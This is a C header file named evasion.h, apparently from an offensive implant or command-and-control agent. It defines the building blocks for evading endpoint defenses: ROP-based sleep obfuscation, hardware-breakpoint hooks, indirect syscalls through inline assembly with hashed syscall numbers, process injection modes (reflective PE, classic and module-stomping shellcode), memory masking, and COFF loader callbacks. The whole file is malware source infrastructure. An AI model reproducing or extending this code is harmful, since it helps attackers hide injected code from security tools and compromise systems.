#ifndef EVASION_H
#define EVASION_H

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Rop[ i ].Rax = U_PTR( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Rop[ i ].Rbx = U_PTR( & p );               \
    } else {                                       \
        Rop[ i ].Rip = U_PTR( p );                 \
    }

/* ======== [ Hardware Breakpoint ] ======== */

#define HW_ALL_THREADS 0x25

enum {
    Dr0,
    Dr1,
    Dr2,
    Dr3
} KH_DRX;

typedef struct _DESCRIPTOR_HOOK {
    ULONG  ThreadID;
    HANDLE Handle;
    BOOL   Processed;
    INT8   Drx;
    UPTR   Address;
    PVOID This;
    VOID ( *Detour )( PCONTEXT, PVOID );
    struct _DESCRIPTOR_HOOK* Next;
    struct _DESCRIPTOR_HOOK* Prev;
} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;

#define CONTINUE_EXEC( Ctx )( Ctx->EFlags = Ctx->EFlags | ( 1 << 16 ) )

#ifdef _WIN64
#define SET_RET( Ctx, Val )( U_PTR( Ctx->Rax = U_PTR( Val ) ) )
#elif  _WIN32
#define SET_RET( Ctx, Val )( U_PTR( Ctx->Eax = U_PTR( Val ) ) )
#endif

#define GET_ARG_1( Ctx ) ( Self->Hw->GetArg( Ctx, 0x1 ) )
#define GET_ARG_2( Ctx ) ( Self->Hw->GetArg( Ctx, 0x2 ) )
#define GET_ARG_3( Ctx ) ( Self->Hw->GetArg( Ctx, 0x3 ) )
#define GET_ARG_4( Ctx ) ( Self->Hw->GetArg( Ctx, 0x4 ) )
#define GET_ARG_5( Ctx ) ( Self->Hw->GetArg( Ctx, 0x5 ) )
#define GET_ARG_6( Ctx ) ( Self->Hw->GetArg( Ctx, 0x6 ) )
#define GET_ARG_7( Ctx ) ( Self->Hw->GetArg( Ctx, 0x7 ) )
#define GET_ARG_8( Ctx ) ( Self->Hw->GetArg( Ctx, 0x8 ) )
#define GET_ARG_9( Ctx ) ( Self->Hw->GetArg( Ctx, 0x9 ) )
#define GET_ARG_A( Ctx ) ( Self->Hw->GetArg( Ctx, 0xA ) )
#define GET_ARG_B( Ctx ) ( Self->Hw->GetArg( Ctx, 0xB ) )

#define SET_ARG_1( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x1 ) )
#define SET_ARG_2( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x2 ) )
#define SET_ARG_3( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x3 ) )
#define SET_ARG_4( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x4 ) )
#define SET_ARG_5( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x5 ) )
#define SET_ARG_6( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x6 ) )
#define SET_ARG_7( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x7 ) )
#define SET_ARG_8( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x8 ) )
#define SET_ARG_9( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0x9 ) )
#define SET_ARG_A( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0xA ) )
#define SET_ARG_B( Ctx, Val ) ( Self->Hw->SetArg( Ctx, Val, 0xB ) )

/* ======== [ Syscalls ] ======== */

#define SY_SEED   0xEDB88320
#define SY_UP     -12
#define SY_DOWN   12
#define SY_RANGE  0xE5

typedef enum ESYS_OPT {
    syAlloc,
    syProtect,
    syWrite,
    syCrThread,
    syQueueApc,
    syOpenThrd,
    syOpenProc,
    syMapView,
    syCrSectn,
    syLast
};

typedef struct {
    ULONG ssn;
    ULONG Hash;
    UPTR  Address;
    UPTR  Instruction;
} EXT, *PEXT;

#define SyscallExec( x, y, ... ) \
Self->Sys->Index = x; \
asm volatile (  \
    "push r14\n\t" \
    "push r15\n\t" \
    "mov r14, %0\n\t"  \
    "mov r15, %1\n\t"  \
    : \
    : "r" (&Self->Sys->Ext[Self->Sys->Index].ssn), "r" (&Self->Sys->Ext[Self->Sys->Index].Instruction) \
    : "memory" \
); \
y = ExecSyscall( __VA_ARGS__ ); \
asm volatile ( \
    "pop r15\n\t" \
    "pop r14\n\t" \
); \

EXTERN_C WINAPI NTSTATUS ExecSyscall( ... );

/* ======== [ Injection ] ======== */

enum {
    PeReflection
} KH_INJ_PE;

enum {
    ScClassic,
    ScStomp
} KH_INJ_SC;

enum {
    MaskTimer = 1,
    MaskApc,
    MaskWait
} KH_MASK;

enum {
    RegRax,
    RegRsi,
    RegRbx = 0x23
} KH_REG;

/* ========= [ Coff ] ========= */

#define COFF_VAR 0x10
#define COFF_FNC 0x20
#define COFF_IMP 0x30

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
#define CALLBACK_CUSTOM      0x1000
#define CALLBACK_CUSTOM_LAST 0x13ff

#endif // EVASION_H